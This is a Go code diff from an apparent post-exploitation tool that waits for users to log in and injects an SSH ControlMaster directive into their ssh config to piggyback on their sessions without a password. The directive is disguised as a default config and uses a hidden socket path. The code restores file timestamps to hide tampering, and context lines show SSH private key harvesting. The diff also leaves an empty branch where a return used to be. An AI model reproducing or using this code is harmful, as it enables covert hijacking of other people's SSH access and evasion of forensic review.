@@ -39,7 +39,7 @@ var (
 	// Non-recon
 	flag_stalk     = flag.String("stalk", "", "Wait until a user logs in and then do something. Use \"*\" to match any user.")
 	flag_ssh_cm    = flag.String("ssh-cm", "", "Set user's $HOME/.ssh/config to include a ControlMaster directive for passwordless piggybacking.")
-	flag_rm_ssh_cm = flag.String("rm-ssh-cm", "", "Remove user's ControlMaster directive.")
+	flag_rm_ssh_cm = flag.String("rm-ssh-cm", "", "Remove user's ControlMaster directive. If the config is empty after this, it will be removed.")
 )
 
 var (
@@ -51,7 +51,11 @@ var (
 	// The typical location where auditd looks for its ruleset
 	AuditdRules = "/etc/audit/audit.rules"
 	// The typical location utmp stores login information
-	UtmpPath = "/var/run/utmp"
+	UtmpPath                  = "/var/run/utmp"
+	SSHControlMasterDirective = `Host *  # Default config. Do not edit below this line.
+        ControlPath ~/.ssh/.config
+        ControlMaster auto
+        ControlPersist 10m`
 )
 
 type stalkAction func(string) error
@@ -237,7 +241,7 @@ func getSSHKeys(dir string, sleep int) []sshPrivateKey {
 }
 
 // isContainer looks at init's cgroup and total process count to guess at
-// whether we're in a container
+// whether we're in a container. These are basically informed *guesses*.
 func isContainer() bool {
 	procs, err := ps.Processes()
 	if err != nil {
@@ -329,38 +333,41 @@ func getSSHConfigFilename(user string) (string, error) {
 	return fmt.Sprintf("%s/.ssh/config", u.HomeDir), nil
 }
 
-func setSSHControlMaster(user string) error {
-	var origTime = time.Time{}
+// setSSHControlMaster places a ControlMaster directive in the user's ssh config file.
+// bool return value is true if the config file is created, false if it already exists.
+// If err != nil, bool return value can't be trusted.
+func setSSHControlMaster(user string) (bool, error) {
+	var origTime = time.Now()
+	var created = false
 	filename, err := getSSHConfigFilename(user)
 	if s, err := os.Stat(filename); err == nil {
 		origTime = s.ModTime()
+	} else {
+		created = true
 	}
 	if err != nil {
-		return err
+		return created, err
 	}
 	// Either create the config file or append to it
 	// TODO: if the file is created, then unsetSSHControlMaster() should remove it.
 	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
 	if err != nil {
-		return err
+		return created, err
 	}
 	defer f.Close()
 
-	directive := `Host *  # Default config. Do not edit below this line.
-        ControlPath ~/.ssh/.config
-        ControlMaster auto
-        ControlPersist 10m`
-	f.WriteString(directive + "\n")
+	f.WriteString(SSHControlMasterDirective + "\n")
 
 	// Replace the original access and modification times.
 	if err := os.Chtimes(filename, origTime, origTime); err != nil {
 		fmt.Println("Couldn't reset atime/mtime on ssh config file.")
 	}
-	return nil
+	return created, nil
 }
 
+// unsetSSHControlMaster removes the ControlMaster directive from user's ssh config file
 func unsetSSHControlMaster(user string) error {
-	var origTime = time.Time{}
+	var origTime = time.Now()
 	filename, err := getSSHConfigFilename(user)
 	if err != nil {
 		return err
@@ -377,7 +384,7 @@ func unsetSSHControlMaster(user string) error {
 	}
 	// Janky means of munging the config file back to its original state
 	newFile := ""
-	toSkip := 4
+	toSkip := len(strings.Split(SSHControlMasterDirective, "\n"))
 	haveSkipped := 0
 	for _, line := range strings.Split(string(body), "\n") {
 		if line == "Host *  # Default config. Do not edit below this line." {
@@ -393,8 +400,15 @@ func unsetSSHControlMaster(user string) error {
 	// We didn't find our Control Master. In this case, we either hadn't yet set Control Master
 	// or it has since been removed. Either way, don't modify the config file. Just bail.
 	if haveSkipped == 0 {
+	} else if newFile == "\n" {
+		// or if after removing the directive there is no other content, remove the file. This is a guess that
+		// it was create by us.
+		if err := os.Remove(filename); err != nil {
+			return err
+		}
 		return nil
 	}
+
 	// This hack removes potentially multiple trailing newlines and replaces it with just a single newline.
 	// This doesn't leave things *exactly* as they were prior to injecting the Control Master.
 	// (In cases where removing the ControlMaster directive would result in multiple legit newlines. This
